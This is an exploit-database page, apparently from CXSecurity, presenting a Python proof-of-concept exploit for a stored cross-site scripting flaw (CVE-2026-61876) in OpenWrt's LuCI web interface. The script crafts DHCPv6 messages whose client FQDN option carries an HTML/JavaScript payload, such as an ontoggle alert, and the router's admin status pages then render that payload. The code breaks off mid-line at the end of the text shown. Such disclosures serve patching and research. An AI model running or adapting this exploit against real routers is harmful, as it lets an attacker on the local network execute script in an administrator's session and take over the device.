---
title: LuCI DHCPv6 Lease Hostname Stored Cross-Site Scripting
url: https://cxsecurity.com/issue/WLB-2026080008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-08-12
fetch_date: 2026-08-13T04:02:47.524993
---

# LuCI DHCPv6 Lease Hostname Stored Cross-Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **LuCI DHCPv6 Lease Hostname Stored Cross-Site Scripting** **2026.08.12**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-61876](https://cxsecurity.com/cveshow/CVE-2026-61876/ "Click to see CVE-2026-61876")**  CWE: **[CWE-79 Improper Neutralization of Input During Web Page Generation (&#039;Cross-site Scripting&#039;)](https://cxsecurity.com/cwe/CWE-79%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20%28%26#039;Cross-site Scripting&#039;) "Click to see CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')")** | |

#!/usr/bin/env python3
# Exploit Title: LuCI DHCPv6 Lease Hostname Stored Cross-Site Scripting
# CVE: CVE-2026-61876
# Date: 2026-07-13
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Author Blog : https://banyamersecurity.com/blog/
# Vendor Homepage: https://openwrt.org/
# Software Link: https://github.com/openwrt/luci
# Affected: OpenWrt LuCI (luci-mod-status, luci-mod-network) before patch
# Tested on: OpenWrt 25.12.0-rc1 x86\_64
# Category: Remote
# Platform: Linux
# Exploit Type: Stored XSS
# CVSS: 8.8
# Description: An unauthenticated adjacent-network attacker can inject malicious HTML/JavaScript via DHCPv6 Client FQDN (option 39). The hostname is stored by odhcpd and rendered unsafely via innerHTML in LuCI status tables.
# Fixed in: LuCI commit 55379d0 (and backports)
# Usage:
# python3 exploit.py --ifindex <LAN\_INTERFACE\_INDEX> --hostname '<payload>'
#
# Examples:
# python3 exploit.py --ifindex 2 --hostname '<details/open/ontoggle=alert("XDHCP6D")>'
#
# Options:
# --ifindex Interface index of the LAN interface
# --hostname Malicious hostname/FQDN payload
# --server DHCPv6 server (default: ff02::1:2)
# --release Release the lease after injection
#
# Notes:
# • Requires adjacent network access (LAN)
# • Administrator must view Status > Overview or Network > DHCP and DNS
# • Payload example triggers alert(); other XSS payloads work too.
#
# How to Use
#
# Step 1:
# Identify your LAN interface index: ip -o link show | awk '{print $1, $2}'
#
# Step 2:
# Run the exploit and then open LuCI as admin to trigger the payload.
def banner():
print(r"""
╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗
║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║
║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ███████╔╝
║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗
║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║
╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝
╔═╗ Banyamer Security ╔═╝
""")
import argparse
import os
import random
import socket
import struct
import time
OPT\_CLIENTID = 1
OPT\_SERVERID = 2
OPT\_IA\_NA = 3
OPT\_ORO = 6
OPT\_ELAPSED = 8
OPT\_STATUS = 13
OPT\_IAADDR = 5
OPT\_FQDN = 39
def opt(code, data):
return struct.pack("!HH", code, len(data)) + data
def options(buf):
i = 0
while i + 4 <= len(buf):
code, length = struct.unpack("!HH", buf[i:i + 4])
i += 4
yield code, buf[i:i + length]
i += length
def first\_opt(buf, wanted):
for code, data in options(buf):
if code == wanted:
return data
return None
def encode\_domain(name):
labels = name.rstrip(".").split(".") if name else []
out = bytearray()
for label in labels:
raw = label.encode("utf-8")
if len(raw) > 63:
raise ValueError("domain label too long for DHCPv6 FQDN option")
out.append(len(raw))
out += raw
out.append(0)
return bytes(out)
def make\_duid(mac):
dhcpv6\_epoch = 946684800
now = int(time.time() - dhcpv6\_epoch)
return struct.pack("!HHI", 1, 1, now) + mac
def make\_msg(msg\_type, txid, opts):
return bytes([msg\_type]) + txid + b"".join(opts)
def parse\_msg(data):
if len(data) < 4:
return None
return data[0], data[1:4], data[4:]
def open\_sock(ifindex, port, bind\_addr):
s = socket.socket(socket.AF\_INET6, socket.SOCK\_DGRAM)
s.settimeout(4)
try:
s.setsockopt(socket.IPPROTO\_IPV6, socket.IPV6\_MULTICAST\_IF, ifindex)
except OSError:
pass
try:
s.bind((bind\_addr, port, 0, ifindex if bind\_addr.startswith("fe80:") else 0))
return s, port
except OSError:
if port != 0:
s.bind((bind\_addr, 0, 0, ifindex if bind\_addr.startswith("fe80:") else 0))
return s, s.getsockname()[1]
raise
def send\_recv(sock, dst, msg, txid, expect\_types):
sock.sendto(msg, dst)
deadline = time.time() + 5
while time.time() < deadline:
try:
data, addr = sock.recvfrom(4096)
except socket.timeout:
break
parsed = parse\_msg(data)
if not parsed:
continue
msg\_type, rxid, opts = parsed
if rxid == txid and msg\_type in expect\_types:
return msg\_type, opts, addr, data
return None
def status\_text(ia\_na):
if not ia\_na:
return ""
for code, data in options(ia\_na[12:]):
if code == OPT\_STATUS and len(data) >= 2:
status = struct.unpack("!H", data[:2])[0]
text = data[2:].decode("utf-8", "replace")
return f"status={status} {text}".strip()
return ""
def main():
banner()
ap = argparse.ArgumentParser(description="LuCI DHCPv6 FQDN XSS Exploit (CVE-2026-61876)")
ap.add\_argument("--ifindex", type=int, required=True)
ap.add\_argument("--hostname", required=True)
ap.add\_argument("--server", default="ff02::1:2")
ap.add\_argument("--bind-addr", default="::")
ap.add\_argument("--port", type=int, default=546)
ap.add\_argument("--release", action="store\_true")
ap.add\_argument("--duid-hex")
ap.add\_argument("--iaid-hex")
args = ap.parse\_args()
if args.duid\_hex:
duid = bytes.fromhex(args.duid\_hex)
mac = duid[-6:] if len(duid) >= 14 else b"\x00" \* 6
else:
mac = bytes([0x02, 0x00, 0x5e, random.randrange(256), random.randrange(256), random.randrange(256)])
duid = make\_duid(mac)
iaid = bytes.fromhex(args.iaid\_hex) if args.iaid\_hex else os.urandom(4)
fqdn = bytes([0]) + encode\_domain(args.hostname)
oro = struct.pack("!HHH", 23, 24, OPT\_FQDN)
sock, sport = open\_sock(args.ifindex, args.port, args.bind\_addr)
dst = (args.server, 547, 0, args.ifindex if args.server.startswith("ff") ...